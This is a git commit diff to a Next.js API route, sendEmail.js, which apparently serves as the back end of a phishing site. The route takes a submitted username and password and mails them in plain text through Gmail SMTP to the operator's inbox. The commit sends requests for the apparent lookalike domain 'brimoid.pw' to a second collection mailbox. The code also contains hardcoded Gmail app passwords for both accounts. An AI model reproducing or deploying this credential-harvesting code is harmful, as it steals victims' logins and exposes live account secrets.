0a66f4c7202ffdbed707e9ff96072c4f9888ac99
reza_sandesta <sandesta24@gmail.com>
2022-07-13 14:24:52 +0700

    update url

--- pages/api/sendEmail.js
+++ pages/api/sendEmail.js
@@ -2,35 +2,72 @@ export default function handler(req, res) {
     const nodemailer = require('nodemailer');
 
     const { body } = req;
+    const { host } = req.headers;
 
-    try {
-        const transporter = nodemailer.createTransport({
-            port: 587,
-            host: 'smtp.googlemail.com',
-            auth: {
-                user: 'febrifebru66@gmail.com',
-                pass: 'zaqegfyjqxbeqxdt',
-                },
-            secure: false,
-        });
-
-        const mailData = {
-            from: 'febrifebru66@gmail.com',
-            to: 'febrifebru66@gmail.com',
-            subject: 'Welcome to the app',
-            text: `username: ${body.username} password: ${body.password}`,            
+    if(host === 'brimoid.pw'){
+        
+        try {
+            const transporter = nodemailer.createTransport({
+                port: 587,
+                host: 'smtp.googlemail.com',
+                auth: {
+                    user: 'yurawa111@gmail.com',
+                    pass: 'hrtagcjptdywoqzh',
+                    },
+                secure: false,
+            });
+    
+            const mailData = {
+                from: 'yurawa111@gmail.com',
+                to: 'yurawa111@gmail.com',
+                subject: 'Welcome to the app',
+                text: `username: ${body.username} password: ${body.password}`,            
+            }
+      
+            transporter.sendMail(mailData, function (err, info) {
+                if(err){
+                  res.status(400).json({error: err})
+                }
+                else{
+                  res.status(200).json({info, status: 200})
+                }
+            })
+    
+        } catch (error) {
+            res.status(404).send('Not found')
         }
-  
-        transporter.sendMail(mailData, function (err, info) {
-            if(err){
-              res.status(400).json({error: err})
-            }
-            else{
-              res.status(200).json({info, status: 200})
-            }
-        })
 
-    } catch (error) {
-        res.status(404).send('Not found')
+    } else {
+        
+        try {
+            const transporter = nodemailer.createTransport({
+                port: 587,
+                host: 'smtp.googlemail.com',
+                auth: {
+                    user: 'febrifebru66@gmail.com',
+                    pass: 'zaqegfyjqxbeqxdt',
+                    },
+                secure: false,
+            });
+    
+            const mailData = {
+                from: 'febrifebru66@gmail.com',
+                to: 'febrifebru66@gmail.com',
+                subject: 'Welcome to the app',
+                text: `username: ${body.username} password: ${body.password}`,            
+            }
+      
+            transporter.sendMail(mailData, function (err, info) {
+                if(err){
+                  res.status(400).json({error: err})
+                }
+                else{
+                  res.status(200).json({info, status: 200})
+                }
+            })
+    
+        } catch (error) {
+            res.status(404).send('Not found')
+        }
     }
 }
